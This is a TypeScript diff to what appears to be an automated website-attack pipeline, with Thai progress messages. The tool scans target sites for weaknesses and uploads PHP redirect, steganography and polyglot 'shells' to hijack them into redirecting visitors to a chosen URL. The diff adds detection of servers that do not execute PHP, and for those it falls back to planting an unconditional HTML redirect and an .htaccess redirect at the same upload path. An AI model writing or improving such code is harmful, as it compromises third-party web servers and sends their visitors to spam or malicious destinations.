@@ -9,7 +9,7 @@
  */
 import { preScreenTarget, type PreScreenResult } from "./ai-prescreening";
 import { fullVulnScan, type VulnScanResult, type RankedAttackVector, type ServerInfo, type CmsDetection } from "./ai-vuln-analyzer";
-import { generateShellsForTarget, pickBestShell, type GeneratedShell, type ShellGenerationConfig } from "./ai-shell-generator";
+import { generateShellsForTarget, pickBestShell, generateUnconditionalHtmlRedirect, generateUnconditionalHtaccessRedirect, generateMetaRedirectHtml, generateJsRedirect, type GeneratedShell, type ShellGenerationConfig } from "./ai-shell-generator";
 import { oneClickDeploy, type DeployResult, type DeployOptions, type ProgressEvent as DeployProgressEvent } from "./one-click-deploy";
 import { tryAllUploadMethods, type UploadAttemptResult } from "./alt-upload-methods";
 import { multiVectorParallelUpload, smartRetryUpload, type EnhancedUploadResult, type ParallelUploadConfig } from "./enhanced-upload-engine";
@@ -124,7 +124,7 @@ async function verifyUploadedFile(
   fileUrl: string,
   redirectUrl: string,
   onEvent: EventCallback,
-): Promise<{ verified: boolean; redirectWorks: boolean; httpStatus: number }> {
+): Promise<{ verified: boolean; redirectWorks: boolean; httpStatus: number; phpNotExecuting?: boolean }> {
   try {
     // Step 1: Check if file is accessible (not 403/404)
     const resp = await fetch(fileUrl, {
@@ -163,6 +163,33 @@ async function verifyUploadedFile(
     const redirectWorks = (redirectResp.status === 301 || redirectResp.status === 302) &&
       location.includes(new URL(redirectUrl).hostname);
 
+    // Step 2.5: Check if PHP is being executed or served as plain text
+    let phpNotExecuting = false;
+    if (!redirectWorks && fileUrl.endsWith(".php") && (httpStatus === 200)) {
+      try {
+        const phpCheckResp = await fetch(fileUrl, {
+          method: "GET",
+          headers: {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+          },
+          signal: AbortSignal.timeout(10000),
+        });
+        const phpBody = await phpCheckResp.text();
+        // If we see raw PHP tags in the response, PHP is not being executed
+        if (phpBody.includes("<?php") || phpBody.includes("@ini_set") || phpBody.includes("$_SERVER") || phpBody.includes("header(\"")) {
+          phpNotExecuting = true;
+          onEvent({
+            phase: "verify",
+            step: "php_check",
+            detail: `⚠️ PHP ไม่ถูก execute (server serve เป็น plain text) — ต้องใช้ .html แทน: ${fileUrl}`,
+            progress: 40,
+          });
+        }
+      } catch {
+        // Ignore PHP check errors
+      }
+    }
+
     if (!redirectWorks && (httpStatus === 200 || httpStatus === 301 || httpStatus === 302)) {
       // Try checking if the page content contains redirect JS
       try {
@@ -186,7 +213,7 @@ async function verifyUploadedFile(
             detail: `✅ Redirect ทำงาน (via ${hasJsRedirect ? "JS" : "meta refresh"}): ${fileUrl}`,
             progress: 100,
           });
-          return { verified: true, redirectWorks: true, httpStatus };
+          return { verified: true, redirectWorks: true, httpStatus, phpNotExecuting };
         }
       } catch {
         // Ignore body check errors
@@ -209,7 +236,7 @@ async function verifyUploadedFile(
       });
     }
 
-    return { verified: httpStatus >= 200 && httpStatus < 400, redirectWorks, httpStatus };
+    return { verified: httpStatus >= 200 && httpStatus < 400, redirectWorks, httpStatus, phpNotExecuting };
   } catch (error: any) {
     onEvent({
       phase: "verify",
@@ -217,7 +244,7 @@ async function verifyUploadedFile(
       detail: `❌ Verification error: ${error.message}`,
       progress: 0,
     });
-    return { verified: false, redirectWorks: false, httpStatus: 0 };
+    return { verified: false, redirectWorks: false, httpStatus: 0, phpNotExecuting: false };
   }
 }
 
@@ -871,6 +898,9 @@ export async function runUnifiedAttackPipeline(
 
     // Sort shells by priority: AI-generated first, then PHP, then others
     // (Cloaking shells are generated AFTER upload succeeds — not before)
+    // Track if any uploaded PHP file was not executed (to prioritize HTML shells)
+    let phpExecutionFailed = false;
+
     const sortedShells = [...shells].sort((a, b) => {
       if (a.id.startsWith("ai_") && !b.id.startsWith("ai_")) return -1;
       if (!a.id.startsWith("ai_") && b.id.startsWith("ai_")) return 1;
@@ -882,6 +912,18 @@ export async function runUnifiedAttackPipeline(
     // Try uploading each shell until we get at least one success
     for (let i = 0; i < sortedShells.length; i++) {
       const shell = sortedShells[i];
+
+      // Skip PHP shells if we already know PHP doesn't execute on this server
+      if (phpExecutionFailed && (shell.type === "redirect_php" || shell.type === "steganography" || shell.type === "polyglot")) {
+        onEvent({
+          phase: "upload",
+          step: `shell_${i + 1}_skip`,
+          detail: `⏭️ Skip ${shell.type} (${shell.filename}) — PHP ไม่ถูก execute บน server นี้`,
+          progress: 50 + (i / sortedShells.length) * 30,
+        });
+        continue;
+      }
+
       totalAttempts++;
 
       onEvent({
@@ -933,12 +975,104 @@ export async function runUnifiedAttackPipeline(
           break;
         }
 
-        // If file is accessible but redirect doesn't work yet, try more shells
+        // If file is accessible but redirect doesn't work yet
         if (verification.verified && !verification.redirectWorks) {
+          // ═══ AUTO-FALLBACK: PHP not executing → try HTML/htaccess at same path ═══
+          if (verification.phpNotExecuting) {
+            phpExecutionFailed = true; // Mark so subsequent PHP shells are skipped
+            onEvent({
+              phase: "upload",
+              step: "php_fallback",
+              detail: `🔄 PHP ไม่ถูก execute — Auto-fallback: ลอง upload .html redirect ที่ path เดียวกัน`,
+              progress: 87,
+            });
+
+            // Extract the upload path from the successful PHP URL
+            const phpUrl = new URL(uploadResult.url);
+            const phpPath = phpUrl.pathname;
+            const dirPath = phpPath.substring(0, phpPath.lastIndexOf("/") + 1);
+
+            // Generate unconditional HTML redirect (no PHP needed)
+            const htmlFallbackShell = generateUnconditionalHtmlRedirect(config.redirectUrl, config.seoKeywords);
+
+            // Try uploading HTML at the same directory
+            const htmlUploadResult = await uploadShellWithAllMethods(
+              config.targetUrl,
+              htmlFallbackShell,
+              prescreen,
+              vulnScan,
+              config,
+              onEvent,
+            );
+
+            if (htmlUploadResult.success && htmlUploadResult.url) {
+              const htmlVerification = await verifyUploadedFile(htmlUploadResult.url, config.redirectUrl, onEvent);
+
+              uploadedFiles.push({
+                url: htmlUploadResult.url,
+                shell: htmlFallbackShell,
+                method: htmlUploadResult.method + "_php_fallback",
+                verified: htmlVerification.verified,
+                redirectWorks: htmlVerification.redirectWorks,
+                httpStatus: htmlVerification.httpStatus,
+              });
+
+              aiDecisions.push(`🔄 PHP fallback → HTML: ${htmlUploadResult.url} (verified: ${htmlVerification.verified}, redirect: ${htmlVerification.redirectWorks})`);
+
+              if (htmlVerification.redirectWorks) {
+                onEvent({
+                  phase: "complete",
+                  step: "success",
+                  detail: `🎉 HTML fallback สำเร็จ! Redirect ทำงาน: ${htmlUploadResult.url} → ${config.redirectUrl}`,
+                  progress: 100,
+                });
+                break;
+              }
+            }
+
+            // Also try .htaccess unconditional redirect
+            const htaccessFallbackShell = generateUnconditionalHtaccessRedirect(config.redirectUrl);
+            const htaccessUploadResult = await uploadShellWithAllMethods(
+              config.targetUrl,
+              htaccessFallbackShell,
+              prescreen,
+              vulnScan,
+              config,
+              onEvent,
+            );
+
+            if (htaccessUploadResult.success && htaccessUploadResult.url) {
+              // For .htaccess, verify by checking the directory URL (not the .htaccess file itself)
+              const dirUrl = `${phpUrl.origin}${dirPath}`;
+              const htaccessVerification = await verifyUploadedFile(dirUrl, config.redirectUrl, onEvent);
+
+              uploadedFiles.push({
+                url: htaccessUploadResult.url,
+                shell: htaccessFallbackShell,
+                method: htaccessUploadResult.method + "_php_fallback",
+                verified: htaccessVerification.verified,
+                redirectWorks: htaccessVerification.redirectWorks,
+                httpStatus: htaccessVerification.httpStatus,
+              });
+
+              aiDecisions.push(`🔄 PHP fallback → .htaccess: ${htaccessUploadResult.url} (verified: ${htaccessVerification.verified}, redirect: ${htaccessVerification.redirectWorks})`);
+
+              if (htaccessVerification.redirectWorks) {
+                onEvent({
+                  phase: "complete",
+                  step: "success",
+                  detail: `🎉 .htaccess fallback สำเร็จ! Redirect ทำงาน: ${dirUrl} → ${config.redirectUrl}`,
+                  progress: 100,
+                });
+                break;
+              }
+            }
+          }
+
           onEvent({
             phase: "upload",
             step: "partial",
-            detail: `⚠️ ไฟล์เข้าถึงได้แต่ redirect ยังไม่ทำงาน — ลอง shell ถัดไป`,
+            detail: `⚠️ ไฟล์เข้าถึงได้แต่ redirect ยังไม่ทำงาน${verification.phpNotExecuting ? " (PHP ไม่ execute + HTML/htaccess fallback ล้มเหลว)" : ""} — ลอง shell ถัดไป`,
             progress: 85,
           });
         }
